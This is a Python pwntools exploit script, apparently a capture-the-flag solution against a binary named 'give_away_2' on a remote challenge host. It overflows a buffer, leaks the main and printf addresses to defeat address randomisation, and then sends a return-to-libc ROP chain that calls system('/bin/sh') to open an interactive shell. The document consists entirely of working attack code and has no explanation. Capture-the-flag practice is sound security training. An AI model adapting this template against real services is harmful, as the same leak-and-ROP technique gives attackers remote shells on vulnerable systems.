from pwn import *

ARCH = 'amd64'
FILE = './give_away_2'
LIBC = 'libc-2.27.so'
HOST = 'sharkyctf.xyz'
PORT = 20335

popret = 0x903
main_offset = 0x864
printf_offset_main = 0x880 # within main function not 'call printf'

def exploit(con, elf, libc, rop):
    sys_offset = libc.symbols.system
    gets_offset = libc.symbols.gets
    printf_offset = libc.symbols.printf
    
    printf_got_rel = elf.got.printf
    
    main_leak = con.recvuntil('\n').strip()
    main_address = int(main_leak.split()[2],16)
    log.info(f'Leaked main address: {hex(main_address)}')
    
    base_address = main_address - main_offset
    gadget = base_address + popret
    printf_got = base_address + printf_got_rel
    printf_plt = base_address + printf_offset_main
    log.info(f'Printf GOT address: {hex(printf_got)}')
    log.info(f'Printf PLT address: {hex(printf_plt)}')

    padding = 40
    payload = b'A' * padding
    payload += p64(gadget)
    payload += p64(printf_got)
    payload += p64(printf_plt)

    log.info(f'Payload: {payload}')
    
    con.sendline(payload)

    leak = con.recv()
    print(leak)
    leaked_address = u64(leak.ljust(8, b"\0"))

    log.info(f'Leaked address   : {hex(leaked_address)}')
        
    libc_address = leaked_address - printf_offset
    sys_address = libc_address + sys_offset
    log.info(f'Libc address     : {hex(libc_address)}')
    log.info(f'System addrss    : {hex(sys_address)}')

    sh_offset = next(libc.search(b'/bin/sh\x00'))
    sh_address = libc_address + sh_offset
    log.info(f'/bin/sh          : {hex(sh_address)}')

    payload = b'A' * padding
    payload += p64(gadget+1)
    payload += p64(gadget)
    payload += p64(sh_address)
    payload += p64(sys_address)

    log.success('Spawning a shell')

    con.sendline(payload)

def main():
    context(arch=ARCH, os='linux')

    if args['REMOTE']:
        con = remote(HOST, PORT)
    elif args['GDB']:
        context.log_level = 'DEBUG'
        con = gdb.debug(FILE,'b main')
    else:
        con = process([FILE])

    elf = ELF(FILE)

    if LIBC != '':
        libc = ELF(LIBC)
    else:
        libc = ''

    rop = ROP([libc,elf])

    exploit(con, elf, libc, rop)
    con.interactive()

if __name__ == '__main__':
    main()
